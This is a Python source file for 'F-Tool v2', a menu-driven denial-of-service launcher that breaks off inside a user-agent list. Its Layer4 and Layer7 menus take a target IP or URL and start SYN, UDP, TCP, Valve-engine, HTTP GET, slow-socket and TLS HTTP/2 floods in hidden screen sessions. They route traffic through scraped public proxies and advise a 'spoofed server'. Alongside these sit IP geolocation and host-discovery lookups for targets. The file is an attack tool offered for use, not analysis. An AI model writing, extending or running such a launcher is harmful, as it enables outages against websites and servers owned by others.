#!/usr/bin/env python3

"""
	 handsome list:
		AnonPrixor ~ Yone ~ Lazercat ~ Catto ~ MrRage ~ Forky ~  Sussy Baka ~ Clowndzzy ~ Godzilla  ~ Baloo4Ever ~ fbi ~ Mrasdaas

"""
from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
try: #pip3 install httpx requests speedtest colorama
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET


class Home:
	def __init__(self,
	help,
	dev):
		self.help = help
		self.dev = dev

	def getproxies(self):
		#self.styleText("\n [*] Downloading Proxy...\n")
		file_name = "utils/http.txt"
		http_proxies = [
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"]
		with open(file_name, 'w'):
			for proxies in http_proxies:
				if httpx.get(proxies).status_code == 200:
					with open(file_name, 'a') as p:
						p.write(httpx.get(proxies).text)
	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): # don't edit this banner lol
		print(f"""
                        {Color.LG}╔══════════════════════╗
    {Color.LC}╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/22      {Color.LG}║
    {Color.LC}╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}28/8/22      {Color.LG}║
    {Color.LC}╚{Color.LB}    ╩ ╚═╝╚═╝╩═╝{Color.LG}v2  {Color.LG}║ {Color.LB}Simple but mighty XD {Color.LG}║
                        {Color.LG}╚══════════════════════╝
    {Color.LR}[{Color.LG}>     Made with ☕ By FDc0d3 & Aya & updated userAgents by H   {Color.LG}<{Color.LR}]""")
		print(Color.LC+"    Type "+Color.LB+"'HELP'"+Color.LC+" to see all commands\n\n")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Proxy")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" WebTool")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" L4/L7/BBoS")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SpeedTest")
		print("\n")
		while True:
			try:
				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
				option = input()
				if option in ['01', '1']:
					os.system('clear')
					Tool.proxy(option)
				elif option in ['02', '2']:
					os.system('clear')
					Tool.webtools()
				elif option in ['03', '3']:
					os.system('clear')
					Tool.bbos()
				elif option in ['04', '4']:
					os.system('clear')
					Tool.spdtest()
				elif option in ['ref', 'REF']:
					self.home()
				elif option in ['home', 'HOME']:
					self.home()
				elif option in ['clear', 'CLEAR']:
					os.system('clear');F_Tool.home()
				elif option in ['help', 'HELP', '?']:
					print(self.help)
				elif option in ['dev', 'DEV']:
					print(self.dev)
				elif option in ['exit', 'EXIT']:
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
				elif option in ['stop', 'STOP']:
					subprocess.run(['pkill screen'], shell=True)
					print(f"{Color.LG} [!] Attack Stopped!")
				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
					os.system('clear');Tool.bbos()
				elif option == "":
					pass
				else:
					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
			except KeyboardInterrupt:
				sys.exit(0)


class response_url:
	def __init__(self,
	headers):
		self.headers = headers

	def lookup(self, url):
		try:
			if url == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			resp = requests.get(f"http://ip-api.com/json/{url}?fields=status,message,country,countryCode,regionName,city,timezone,asname,isp,org,reverse,query", headers=self.headers).json()
			if resp['status'] == 'success':
				return Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']

			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def ip_lookup(self, ip):
		try:
			if ip == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()
			if resp['status'] == 'success':
				return Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])
			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except KeyError:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def http_status(self, url):
		try:
			if parse.urlparse(url).scheme == "":
				url = "http://"+url
			resp = httpx.get(url, headers=self.headers)
			if resp.status_code == 200:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (OK)"
			elif resp.status_code == 301:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Moved Permanently)"
			elif resp.status_code == 302:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Found)"
			elif resp.status_code == 303:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (See Other)"
			elif resp.status_code == 307:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Temporary Redirect)"
			elif resp.status_code == 400:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Unauthorized)"
			elif resp.status_code == 410:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gone)"
			elif resp.status_code == 401:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Requests)"
			elif resp.status_code == 403:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Forbidden)"
			elif resp.status_code == 404:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Not Found)"
			elif resp.status_code == 429:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (To Many Requests)"
			elif resp.status_code == 500:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Internal Server Error)"
			elif resp.status_code == 502:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Gateway)"
			elif resp.status_code == 503:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Service Unavailable)"
			elif resp.status_code == 504:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gateway Timeout)"
			elif resp.status_code == 507:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Insufficient Storage)"
			elif resp.status_code == 508:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Loop Detected)"
			else:
				return Color.LR+f"    [+] Result: (Connection timeout)"

		except httpx.TimeoutException:
			return Color.LR+f"     [+] Result: (Connection timeout)"
		except httpx.ConnectError:
			return Color.LR+f"    [+] Result: Error occurred"
		except httpx.UnsupportedProtocol:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"

	def findhost(self, host):
		try:
			resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={host}", headers=self.headers)

			if resp.text == 'error invalid host':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			else:
				return Color.LG+resp.text
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def extractlink(self, url):
		try:
			resp = requests.get(f"https://api.hackertarget.com/pagelinks/?q={url}", headers=self.headers)

			if resp.text == "input url is invalid":
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			elif resp.text == "error getting links":
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" No Links Found!"
			else:
				return Color.LG+resp.text
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."


class Tool:
	def __init__(self,
	help,
	dev,
	headers):
		self.help = help
		self.dev = dev
		self.headers = headers

	def proxy(self, new):
		try:
			with open("utils/url.json", 'r') as p:
				readjson = json.loads(p.read())
		except FileNotFoundError:
			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'utils' NotFound")
		if new in ['ref', 'REF', 'clear', 'CLEAR']:
			os.system('clear')
			F_Tool.styleText("[*] Downloading New Proxy...")
		else:
			F_Tool.styleText("[*] Downloading All Proxy...")
		try:
			for proxy in readjson['Proxies']:
				if proxy['type'] == 1:
					if requests.get(proxy["url"]).status_code == 200:
						http = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 2:
					if requests.get(proxy["url"]).status_code == 200:
						https = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 3:
					if requests.get(proxy["url"]).status_code == 200:
						socks4 = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 4:
					if requests.get(proxy["url"]).status_code == 200:
						socks5 = requests.get(proxy["url"], headers=self.headers).text
			os.system('clear')
		except requests.exceptions.ConnectionError:
			sys.exit(Color.LR+"\nError: Check your Internet Connection.")
		print(f"""{Color.LG}

     ___               _
    / _ \_ __ _____  _(_) ___  ___
   / /_)/ '__/ _ \ \/ / |/ _ \/ __|
  / ___/| | | (_) >  <| |  __/\__ )
  \/    |_|  \___/_/\_\_|\___||___/


""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HTTP PROXY")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTPS PROXY")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" SOCKS4 PROXY")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" SOCKS5 PROXY")
		print("\n")
		while True:
				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
				option = input()
				if option in ['01', '1']:
					with open("http.txt", 'w') as p:
						p.write(http)
					print(Color.LG+"[+]"+Color.LC+" HTTP Saved to http.txt")
				elif option in ['02', '2']:
					with open("https.txt", 'w') as p:
						p.write(https)
					print(Color.LG+"[+]"+Color.LC+" HTTPS to https.txt")
				elif option in ['03', '3']:
					with open("socks4.txt", 'w') as p:
						p.write(socks4)
					print(Color.LG+"[+]"+Color.LC+" SOCKS4 Saved to socks4.txt")
				elif option in ['04', '4']:
					with open("socks5.txt", 'w') as p:
						p.write(socks5)
					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Saved to socks5.txt")
				elif option in ['ref', 'REF']:
					self.proxy(option)
				elif option in ['home', 'HOME']:
					F_Tool.home()
				elif option in ['clear', 'CLEAR']:
					os.system('clear')
					self.proxy(option)
				elif option in ['help', 'HELP', '?']:
					print(self.help)
				elif option in ['dev', 'DEV']:
					print(self.dev)
				elif option in ['exit', 'EXIT']:
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
				elif option in ['stop', 'STOP']:
					subprocess.run(['pkill screen'], shell=True)
					print(f"{Color.LG} [!] Attack Stopped!")
				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
					os.system('clear');Tool.bbos()
				elif option == "":
					pass
				else:
					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def webtools(self):
		print(f"""{Color.LG}

   __    __     _    _____            _
  / / /\ \ \___| |__/__   \___   ___ | |
  \ \/  \/ / _ \ '_ \ / /\/ _ \ / _ \| |
   \  /\  /  __/ |_) / / | (_) | (_) | |
    \/  \/ \___|_.__/\/   \___/ \___/|_|


""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" LOOKUP")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" IP INFO")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP STATUS")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" FIND HOST")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" EXTRACT LINK")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				while True:
					lookup = input(Color.LR+"["+Color.LG+"LOOKUP"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(lookup)
					host = parser.netloc
					if parser.scheme == 'https' or parser.scheme == 'http':
						host = parser.netloc
					elif parser.scheme == '':
						url = "http://"+parser.path
						parser = parse.urlparse(url)
						host = parser.netloc
					print(response_url(self.headers).lookup(host))
					break
			elif option in ['02', '2']:
				while True:
					ip_lookup = input(Color.LR+"["+Color.LG+"IP INFO"+Color.LR+"]"+Color.LC+" Enter Target IP: "+Color.RESET)
					print(response_url(self.headers).ip_lookup(ip_lookup))
					break
			elif option in ['03', '3']:
				while True:
					http = input(Color.LR+"["+Color.LG+"HTTPCHECK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).http_status(http))
					break
			elif option in ['04', '4']:
				while True:
					findhost = input(Color.LR+"["+Color.LG+"FINDHOST"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(findhost)
					host = parser.netloc
					path = parser.path.replace("/", "")
					if parser.scheme == 'https' or parser.scheme == 'http':
						print(response_url(self.headers).findhost(host))
					elif host == '':
						print(response_url(self.headers).findhost(path))
					break
			elif option in ['05', '5']:
				while True:
					excractlink = input(Color.LR+"["+Color.LG+"EXCRACTLINK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).extractlink(excractlink))
					break
			elif option in ['ref', 'REF']:
				self.webtools()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.webtools()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def spdtest(self):
		print(f"""{Color.LG}

   __                     _ _____          _
  / _\_ __   ___  ___  __| /__   \___  ___| |_
  \ \| '_ \ / _ \/ _ \/ _` | / /\/ _ \/ __| __|
  _\ \ |_) |  __/  __/ (_| |/ / |  __/\__ \ |_
  \__/ .__/ \___|\___|\__,_|\/   \___||___/\__|
     |_|


""")
		try:
			spdt = speedtest.Speedtest()

			print(Color.LC+"[*] Loading Server List...")
			spdt.get_servers()
			time.sleep(0.1)

			print(Color.LC+"[*] Choosing Best Server...")
			get = spdt.get_best_server()
			time.sleep(0.1)

			print(Color.LC+"\n[+] "+Color.LC+"Host:"+Color.LY+f" {get['host']}")
			time.sleep(0.1)
			print(Color.LC+"[+] "+Color.LC+"Location:"+Color.LY+f" {get['name']}")

			print(Color.LC+"\n[*] Performing Download Test...")
			download_result = spdt.download()

			print(Color.LC+"[*] Performing Upload Test...")
			upload_result = spdt.upload()
			ping_result = spdt.results.ping

			time.sleep(0.1)
			print(Color.LC+"\nResults:\n")
			time.sleep(0.1)
			print(Color.LC+"[+] Download Speed:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Upload Speed:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
			print("\n")
		except Exception:
			print(Color.LR+"Error: Check your Internet Connection.\n\n")


	def bbos(self):
		print(Color.LR+"\n\n    [>    "+Color.LG+"Please use spoofed server for the best experience."+Color.LR+"    <]\n\n")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Layer4")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				os.system('clear');self.l4()
			elif option in ['02', '2']:
				os.system('clear');self.l7()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.bbos()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'Dev']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l4(self):
		print(f"""{Color.LG}
     __                       _  _
    / /  __ _ _   _  ___ _ __| || |
   / /  / _` | | | |/ _ \ '__| || |_
  / /__| (_| | |_| |  __/ |  |__   _|
  \____/\__,_|\__, |\___|_|     |_|
              |___/

""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" VSE: UDP Valve Source Engine specific flood")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" SYN: TCP SYN flood")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" TCP: TCP junk flood")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" UDP:  UDP junk flood")
		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP: HTTP GET request flood")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['02', '2']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['03', '3']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['04', '4']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['05', '5']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['ref', 'REF']:
				self.l4()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.l4()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['00', '0']:
				os.system('clear');self.bbos()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l7(self):
		print(f"""{Color.LG}
     __                      _____
    / /  __ _ _   _  ___ _ _|___  |
   / /  / _` | | | |/ _ \ '__| / /
  / /__| (_| | |_| |  __/ |   / /
  \____/\__,_|\__, |\___|_|  /_/
              |___/

""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1.1 socket flood (JS)")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET flood (JS)")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET flood (JS)")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['02', '2']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['02', '3']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['04', '4']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['ref', 'REF']:
				self.l7()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear')
				self.l7()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['00', '0']:
				os.system('clear');self.bbos()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

def soon():
	pass

def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
	'Chrome/34.0.1847.116 Safari/537.36',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
